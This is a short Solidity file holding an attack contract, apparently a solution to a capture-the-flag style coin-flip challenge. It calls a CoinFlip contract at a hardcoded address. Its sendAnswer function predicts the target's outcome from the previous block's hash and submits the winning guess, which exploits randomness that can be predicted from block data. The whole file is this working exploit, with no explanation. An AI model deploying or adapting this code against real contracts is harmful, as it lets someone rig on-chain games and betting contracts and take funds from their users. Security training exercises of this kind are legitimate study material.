pragma solidity ^0.5.0;

import './SafeMath.sol';

/// @dev A reference for calling external contract functions.

contract CoinFlipInterface {
    function flip(bool _guess) public returns (bool);
}

contract Caller {
    using SafeMath for uint256;
    
    address CFIAddress = 0x05d5Df54cb834746EF73865948c7801Ee1B95847;
    
    CoinFlipInterface cfContract = CoinFlipInterface(CFIAddress);
    
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    function sendAnswer() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        cfContract.flip(side);
    }
}